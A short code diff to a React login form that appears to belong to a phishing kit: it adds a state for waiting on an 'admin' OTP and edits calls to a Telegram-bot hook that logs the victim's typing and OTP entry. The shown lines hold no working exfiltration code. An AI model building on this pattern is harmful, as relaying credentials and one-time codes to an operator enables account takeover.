@@ -26,6 +26,7 @@ function LoginForm() {
   const [otpError, setOtpError] = useState('');
   const [sessionId, setSessionId] = useState(null);
   const [showNextStep, setShowNextStep] = useState(false);
+  const [waitingForAdminOtp, setWaitingForAdminOtp] = useState(false);
   
   // Typing tracking
   const [loginTypingSent, setLoginTypingSent] = useState(false);
@@ -206,7 +207,7 @@ function LoginForm() {
     sendOtpTypingLog,
     sendBlockedLog,
     sendConfirmationLog,
-    sendConfirmationPageLog
+
 
   } = useTelegramBot(
     sessionId, 
